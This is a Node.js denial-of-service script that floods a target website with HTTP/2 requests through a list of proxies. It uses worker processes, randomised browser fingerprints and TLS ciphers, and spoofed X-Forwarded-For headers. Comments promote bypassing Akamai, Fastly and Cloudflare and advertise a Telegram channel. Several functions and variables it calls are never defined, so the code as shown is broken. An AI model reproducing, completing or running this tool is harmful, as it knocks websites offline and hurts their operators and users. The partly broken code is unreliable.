//PCM

 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const colors = require('colors');
 const os = require("os");
 const http = require("http");
 const fakeua = require("fake-useragent");
 const useragent = require("useragent");
 const axios = require("axios");
 const argv = require('minimist')(process.argv.slice(2));
  const generateLargeData = () => crypto.randomBytes(1024 * 1024).toString('hex');
const errorHandler = error => {
    //console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

if (process.argv.length < 7){console.log(`Usage: target time rate thread proxyfile`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "abcdefghijklmnopqrstuvwxyz";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();


 const ip_spoof2 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 9999);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed2 = ip_spoof2();

 const ip_spoof1 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 50000);
   };
   return `${getRandomByte()}`;
 };

 const ip_spoof3 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 9999);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed3 = ip_spoof3();
 
 const ip_spoof4 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 50000);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed4 = ip_spoof4(); 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6],
 }

function generateRandomPriority() {
  const randomPriority = Math.floor(Math.random() * 256);
  return randomPriority;
}

const randomPriorityValue = generateRandomPriority();

function generateRandomString(minLength, maxLength) {
					const characters = 'abcdefghijklmnopqrstuvwxyz'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
 const sig = [    
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
const sigalgs1 = sig.join(':');
cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM"
    ];
const val = { 'NEl': JSON.stringify({
			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
			"include_subdomains": Math.random() < 0.5 ? true : false}),
            }

 const accept_header = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
  ];
lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK'
  ];
 const encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate',
 ];
 
const control_header = [
    '*/*',
    'max-age=604800',
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0',
    'max-age=0, private, must-revalidate',
    'no-cache, no-store, private, max-age=0, must-revalidate',
    'no-cache, no-store, private, s-maxage=604800, must-revalidate',
    'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
    'no-cache, no-store, max-age=0, must-revalidate',
    'no-store, no-cache, must-revalidate',
    'public, max-age=0, s-maxage=3600, must-revalidate, stale-while-revalidate=28800',
    'no-cache, no-store, private, max-age=604800, must-revalidate'
];

 const nm = [
"110.0.0.0",
"111.0.0.0",
"112.0.0.0",
"113.0.0.0",
"114.0.0.0",
"115.0.0.0",
"116.0.0.0",
"117.0.0.0",
"118.0.0.0",
"119.0.0.0",
];
const nmx = [
"120.0",
"119.0",
"118.0",
"117.0",
"116.0",
"115.0",
"114.0",
"113.0",
"112.0",
"111.0",
];
const nmx1 = [
"105.0.0.0",
"104.0.0.0",
"103.0.0.0",
"102.0.0.0",
"101.0.0.0",
"100.0.0.0",
"99.0.0.0",
"98.0.0.0",
"97.0.0.0",
];
const sysos = [
"Windows 1.01",
"Windows 1.02",
"Windows 1.03",
"Windows 1.04",
"Windows 2.01",
"Windows 3.0",
"Windows NT 3.1",
"Windows NT 3.5",
"Windows 95",
"Windows 98",
"Windows 2006",
"Windows NT 4.0",
"Windows 95 Edition",
"Windows 98 Edition",
"Windows Me",
"Windows Business",
"Windows XP",
"Windows 7",
"Windows 8",
"Windows 10 version 1507",
"Windows 10 version 1511",
"Windows 10 version 1607",
"Windows 10 version 1703",
];
const winarch = [
"x86-16",
"x86-16, IA32",
"IA-32",
"IA-32, Alpha, MIPS",
"IA-32, Alpha, MIPS, PowerPC",
"Itanium",
"x86_64",
"IA-32, x86-64",
"IA-32, x86-64, ARM64",
"x86-64, ARM64",
"ARMv4, MIPS, SH-3",
"ARMv4",
"ARMv5",
"ARMv7",
"IA-32, x86-64, Itanium",
"IA-32, x86-64, Itanium",
"x86-64, Itanium",
];
const winch = [
"2012 R2",
"2019 R2",
"2012 R2 Datacenter",
"Server Blue",
"Longhorn Server",
"Whistler Server",
"Shell Release",
"Daytona",
"Razzle",
"HPC 2008",
];

 var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
 var nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
 var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
 var nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
 var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
 var nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];
 
 const uap = [
 generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 Edg/" + nm1,
 generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + "; rv:" + nm4 + ") Gecko/20100101 Firefox/" + nm4,
 generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36",
 generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ")) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 OPR/" + nm6,
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DCO-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SO-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-N986N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2104K10I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A305GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; RMX2061) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2413) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Infinix X6815B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1814) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 13; SM-A042F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2101K6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Android 10; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0',
'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
];
const tips1 =[
 "use premium proxy will get more request/s",
 "this script only work on http/2!",
 "recommended big proxyfile if target is akamai/fastly",
 "dont trying resell my script!! @Akafastly",
 "My channel: https://t.me/SaturnSpark"
];
const platformd = [
 "Windows",
 "Linux",
 "Android",
 "iOS",
 "Mac OS",
 "iPadOS",
 "BlackBerry OS",
 "Firefox OS",
];
const rdom2 = [
 "hello server",
 "hello cloudflare",
 "hello client",
 "hello world",
 "hello akamai",
 "hello cdnfly",
 "hello kitty"
];
const patch = [
   "/",
   "/",
   "/",
  "?page=1",
  "?page=2",
  "?page=3",
  "?category=news",
  "?category=sports",
  "?category=technology",
  "?category=entertainment", 
  "?sort=newest",
  "?filter=popular",
  "?limit=10",
  "?start_date=1989-06-04",
  "?end_date=1989-06-04",
  "?",
  "!",
];
const uaa = [
 '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
 '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="99"',
 '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="16"',
 '"Google Chrome";v="116", "Chromium";v="116", "Not?A_Brand";v="8"',
 '"Google Chrome";v="115", "Chromium";v="115", "Not?A_Brand";v="99"',
 '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="24"',
 '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="24"',
]
const pua = [
 "Linux",
 "Windows",
 "Mac OS",
];
const nua = [
 "SA/3 Mobile",
 "Mobile",
 "Mobile Windows",
];
const langua = [
 "; en-US",
 "; ko-KR",
 "; en-US",
 "; zh-CN",
 "; zh-TW",
 "; ja-JP",
 "; en-GB",
 "; en-AU",
 "; en-CA",
 "; en-NZ",
 "; en-ZA",
 "; en-IN",
 "; en-PH",
 "; en-SG",
 "; en-HK",
];
const FA = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];
const FAB = ['Aberration', 'Benevolence', 'Catalyst', 'Dichotomy', 'Ephemeral',
  'Fecund', 'Garrulous', 'Harmony', 'Ineffable', 'Juxtapose', 'Kindle', 'Labyrinthine',
  'Mirthful', 'Nebulous', 'Obfuscate', 'Pernicious', 'Quintessential', 'Rambunctious',
  'Surreptitious', 'Tangible', 'Ubiquitous', 'Vicarious', 'Whimsical', 'Xenial',
  'Yonder', 'Zephyr', 'Allure', 'Benevolent', 'Cacophony', 'Dulcet', 'Enigmatic',
  'Fervor', 'Gregarious', 'Halcyon', 'Ineffable', 'Jubilant', 'Kaleidoscope',
  'Luminous', 'Mellifluous', 'Nefarious', 'Opulent', 'Prolific', 'Quixotic',
  'Resilient', 'Serenity', 'Tranquil', 'Unabashed', 'Voracious', 'Wanderlust', 'Xenophile', 'Yearning', 'Zestful'];
const mad = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'],

ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET',  'ENETUNREACH',  'ENONET',  'ENOTCONN',  'ENOTFOUND',  'EAI_NODATA',  'EAI_NONAME',  'EADDRNOTAVAIL',  'EAFNOSUPPORT',  'EALREADY',  'EBADF',  'ECONNABORTED',  'EDESTADDRREQ',  'EDQUOT',  'EFAULT',  'EHOSTUNREACH',  'EIDRM',  'EILSEQ',  'EINPROGRESS',  'EINTR',  'EINVAL',  'EIO',  'EISCONN',  'EMFILE',  'EMLINK',  'EMSGSIZE',  'ENAMETOOLONG',  'ENETDOWN',  'ENOBUFS',  'ENODEV',  'ENOENT',  'ENOMEM',  'ENOPROTOOPT',  'ENOSPC',  'ENOSYS',  'ENOTDIR',  'ENOTEMPTY',  'ENOTSOCK',  'EOPNOTSUPP',  'EPERM',  'EPIPE',  'EPROTONOSUPPORT',  'ERANGE',  'EROFS',  'ESHUTDOWN',  'ESPIPE',  'ESRCH',  'ETIME',  'ETXTBSY',  'EXDEV',  'UNKNOWN',  'DEPTH_ZERO_SELF_SIGNED_CERT',  'UNABLE_TO_VERIFY_LEAF_SIGNATURE',  'CERT_HAS_EXPIRED',  'CERT_NOT_YET_VALID'];

process.on('uncaughtException', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).on('unhandledRejection', function (e) {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).on('warning', e => {
if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //console.warn(e);
}).setMaxListeners(0);

 var FA1 = FA[Math.floor(Math.floor(Math.random() * FA.length))];
 var FAB1 = FAB[Math.floor(Math.floor(Math.random() * FAB.length))];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var nua1 = nua[Math.floor(Math.floor(Math.random() * nua.length))];
 var mad1 = mad[Math.floor(Math.floor(Math.random() * mad.length))];
 var langua1 = langua[Math.floor(Math.floor(Math.random() * langua.length))];
 var random = rdom2[Math.floor(Math.floor(Math.random() * rdom2.length))];
 var patched = patch[Math.floor(Math.floor(Math.random() * patch.length))];
 var platformx = platformd[Math.floor(Math.floor(Math.random() * platformd.length))];
 var uaas = uaa[Math.floor(Math.floor(Math.random() * uaa.length))];
 var puaa = pua[Math.floor(Math.floor(Math.random() * pua.length))];
 var tipsz = tips1[Math.floor(Math.floor(Math.random() * tips1.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
 var multi = FA1 + "-" + FAB1 + ": " + mad1 + "-" + generateRandomString(4,25);
 var multi2 = FAB1 + "-" + FA1 + ": " + mad1 + "-" + generateRandomString(4,16);
 
const rateHeaders = [
//{ "cookie": "cf-clearance=" + generateRandomString(16,64) },
{ "origin": "https://" + parsedTarget.host + "/" },
{ "x-requested-with": "XMLHttpRequest" },
{ "cache-control": "private" },
//{ "Expect-CT": "99-OK" },
];
const rateHeaders2 = [
{ "accept-char": "UTF-8" },
{ "Geo-Location": "UNKNOWN" },
{ "X-Forwarded-For": spoofed },
{ "Width": "1920" }, 
];
const rateHeaders3 = [
{ "devxice-memory": "0.3" },
{ "eaccept-languagep": lang },
{ "X-drequested-withp": "XMLHttpRequest" },
{ "Viecwport-widthp": "1080" },
];
const rateHeaders4 = [
{ "Maxw-Forwardsp": "5" },
{ "prawgmap": "no-cache" },
{ "Sewc-ch-uwa-Archp": "Private" },
{ "Seac-Gpxcp": "1" },
];
const rateHeaders5 = [
{ "Accept-CH": "Width" },
{ "Accept-patch": patched },
{ "client-control": "no-cache" },
{ "DPR": "25" },
];
const rateHeaders6 = [
{ "Early-data": "1" },
{ "Downlink": "1.5" },
{ "Sec-purpose": "prefetch" },
{ "Sec-gpc": "1" },
{ "vary": "Width" },
];

const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 1000;

 if (cluster.isMaster) {
  console.clear()
  console.log(`--------------------------------------------`)
  console.log(`Target: `+ process.argv[2])
  console.log(`Time: `+ process.argv[3])
  console.log(`Rate: `+ process.argv[4])
  console.log(`Thread:` + process.argv[5])
  console.log(`ProxyFile: `+ process.argv[6])
  console.log(`Test Script Only`)
  console.log(`--------------------------------------------`)

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
 async HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = await net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 600000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
 
 const path = parsedTarget.path.replace(/%RAND%/, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join(''));
 const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":method"] = "POST";
headers[":authority"] = parsedTarget.host;
headers["x-forwarded-proto"] = "https";
headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
headers[":scheme"] = "https";
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
headers[":authority"] = parsedTarget.host;
headers["origin"] = parsedTarget.host;
headers["Content-Type"] = randomHeaders['Content-Type'];
headers[":scheme"] = "https";
headers["x-download-options"] = randomHeaders['x-download-options'];
headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
headers["X-Forwarded-For"] = spoofed;
headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
headers["accept"] = randomHeaders['accept'];
headers["accept"] = randomHeaders['accept'];
headers["accept"] = accept;
